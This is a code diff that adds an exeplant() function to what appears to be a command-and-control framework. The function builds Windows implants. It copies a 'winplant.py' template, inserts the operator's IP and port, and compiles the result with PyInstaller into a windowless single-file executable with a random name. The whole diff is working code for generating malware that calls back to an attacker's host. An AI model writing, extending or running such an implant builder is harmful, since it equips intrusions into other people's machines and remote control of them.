@@ -169,3 +169,32 @@ def linplant():
         print(f'[+] {file_name} saved to {check_cwd}')
     else:
         print('[-] Some error occurred with generation.')
+
+def exeplant():
+    ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
+    file_name = f'{ran_name}.py'
+    exe_file = f'{ran_name}.exe'
+    check_cwd = os.getcwd()
+    if os.path.exists(f'{check_cwd}\\winplant.py'):
+        shutil.copy('winplant.py', file_name)
+    else:
+        print('[-] winplant.py file not found.')
+    with open(file_name) as f:
+        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
+    with open(file_name, 'w') as f:
+        f.write(new_host)
+    f.close()
+    with open(file_name) as f:
+        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
+    with open(file_name, 'w') as f:
+        f.write(new_port)
+    f.close()
+    pyinstaller_exec = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
+    print(f'[+] Compiling executable {exe_file}...')
+    subprocess.call(pyinstaller_exec, stderr=subprocess.DEVNULL)
+    os.remove(f'{ran_name}.spec')
+    shutil.rmtree('build')
+    if os.path.exists(f'{check_cwd}\\{exe_file}'):
+        print(f'[+] {exe_file} saved to current directory.')
+    else:
+        print('[-] Some error occured during generation.')
